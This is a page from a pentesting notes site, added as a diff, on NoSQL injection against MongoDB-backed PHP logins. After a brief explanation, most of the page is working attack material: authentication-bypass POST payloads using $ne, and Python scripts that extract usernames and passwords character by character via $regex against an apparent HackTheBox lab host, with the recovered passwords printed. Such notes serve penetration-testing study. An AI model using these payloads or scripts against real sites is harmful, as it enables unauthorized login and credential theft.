@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>NoSQL Injection (NoSQLi) | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="NoSQL Injection (NoSQLi)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="NoSQL injection attacks can be especially dangerous because code" />
+<meta property="og:description" content="NoSQL injection attacks can be especially dangerous because code" />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/web/nosqli/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/web/nosqli/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"NoSQL injection attacks can be especially dangerous because code","url":"http://0.0.0.0:4000/hackingnotes/web/nosqli/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"NoSQL Injection (NoSQLi)","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Web</h2>
+				<h3>NoSQL Injection (NoSQLi)</h3>
+			</div>
+			<article class="content">
+				<p>NoSQL injection attacks can be especially dangerous because code</p>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>NoSQL injection vulnerabilities allow attackers to inject code into commands for databases that don’t use SQL queries, such as MongoDB. NoSQL injection attacks can be especially dangerous because code is injected and executed on the server in the language of the web application, potentially allowing arbitrary code execution.</p>
+
+<h2 id="simple-mongodb-injection">Simple MongoDB Injection</h2>
+
+<p>For a basic authentication bypass, the attacker can try to enter MongoDB operators in field values, for example <code class="highlighter-rouge">$eq</code> (equals), <code class="highlighter-rouge">$ne</code> (not equal to) or <code class="highlighter-rouge">$gt</code> (greater than). Here’s an unsafe way to build a database query in a PHP application, with the parameter values taken directly from a form:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$query = array("user" =&gt; $_POST["username"], "password" =&gt; 
+    $_POST["password"]);
+</code></pre></div></div>
+
+<p>If this query is then used to check login credentials, the attacker can abuse PHP’s built-in associative array processing to inject a MongoDB query that always returns true and bypass the authentication process. This may be as simple as sending the following POST request:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username[$ne]=1&amp;password[$ne]=1
+</code></pre></div></div>
+
+<p>PHP will translate this into an array of arrays:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>array("username" =&gt; array("$ne" =&gt; 1), "password" =&gt; 
+    array("$ne" =&gt; 1));
+</code></pre></div></div>
+
+<p>When sent as a MongoDB query to a user store, this will find all users where the user name and password are not equal to 1, which is highly likely to be true and may allow the attacker to bypass authentication.</p>
+
+<h1 id="login-bypass-php">Login Bypass (PHP)</h1>
+
+<p>Injecting the <code class="highlighter-rouge">$ne</code> :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Find some one where username not equals to "" and password not equals to ""
+username[$ne]=&amp;password[$ne]=&amp;login=login
+</code></pre></div></div>
+
+<h2 id="dumping-database-php">Dumping Database (PHP)</h2>
+
+<p>First instead of <code class="highlighter-rouge">$ne</code> we are going to use <code class="highlighter-rouge">$regex</code> in order to discover character by character.</p>
+
+<h3 id="get-all-usernames">Get all Usernames</h3>
+
+<p>First we are going to see al type of characters used in the usernames.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import sys, os, requests, codecs
+import string
+
+s = requests.Session()
+
+
+for char in string.ascii_lowercase:
+
+	regex = '{}.*'.format(char)
+	data_post = {
+		"username[$regex]" : regex,
+		"password[$ne]" : "password",
+		"login" : "login"
+	}
+	resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
+	if resp.status_code == 302:
+		print("Valid letter: " + char)
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Regex:</strong> {}.*</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 exploit.py
+Valid letter: a
+Valid letter: d
+Valid letter: g
+Valid letter: i
+Valid letter: m
+Valid letter: n
+Valid letter: o
+</code></pre></div></div>
+
+<p>Secondly, we are going to check which one goes at firs position:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import sys, os, requests, codecs
+import string
+
+s = requests.Session()
+
+valid_letters = ['a', 'd', 'g', 'i', 'm', 'n', 'o']
+
+for char in valid_letters:
+
+	regex = '^{}.*'.format(char)
+	data_post = {
+		"username[$regex]" : regex,
+		"password[$ne]" : "password",
+		"login" : "login"
+	}
+	resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
+	if resp.status_code == 302:
+		print("Starts with: " + char)
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Regex:</strong> ^{}.* ^ Indicates starts with</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 exploit.py
+Starts with: a
+Starts with: m
+</code></pre></div></div>
+
+<p>Finally we are going to loop until fails all characters used.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import sys, os, requests, codecs
+import string
+
+s = requests.Session()
+
+def nextLetter(word):
+	valid_letters = ['a', 'd', 'g', 'i', 'm', 'n', 'o']
+	for char in valid_letters:
+
+		regex = '^{}.*'.format(word+char)
+		data_post = {
+			"username[$regex]" : regex,
+			"password[$ne]" : "password",
+			"login" : "login"
+		}
+		resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
+		if resp.status_code == 302:
+			return char
+	return None
+
+def getUser(start):
+
+	name = start
+	while True:
+		l = nextLetter(name)
+		if l is None:
+			break;
+		else:
+			name += l
+	return name
+
+startsWith = ['a', 'm']
+for char in startsWith:
+	print('Username: ' + getUser(char))
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 enum_letters.py
+Username: admin
+Username: mango
+</code></pre></div></div>
+
+<h3 id="get-passwords">Get Passwords:</h3>
+
+<p>Same as users but remember to change the <code class="highlighter-rouge">$regex</code> of the user to <code class="highlighter-rouge">$ne</code> and the other way with password.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import sys, os, requests, codecs
+import string
+
+s = requests.Session()
+
+def nextLetter(user, word):
+
+	special_char = ['^','*', '$', '|', '.','\\' ,'+','?']
+	for char in string.printable:
+		if char in special_char:
+			continue;
+		regex = '^{}.*'.format(word+char)
+		data_post = {
+			"username" : user,
+			"password[$regex]" : regex,
+			"login" : "login"
+		}
+		resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
+		if resp.status_code == 302:
+			return char
+	return None
+
+def getPass(user):
+
+	passw = ""
+	while True:
+		l = nextLetter(user, passw)
+		if l is None:
+			break;
+		else:
+			passw += l
+	return passw
+
+users = ['admin', 'mango']
+for user in users:
+	print('Username: ' + user + ' Password: ' + getPass(user))
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 exploit.py
+Username: admin Password: t9KcS3&gt;!0B#2
+Username: mango Password: h3mXK8RhU~f{]f5H
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Remember:</strong> Escape characters that could lead to problems with a regex.</p>
+</blockquote>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
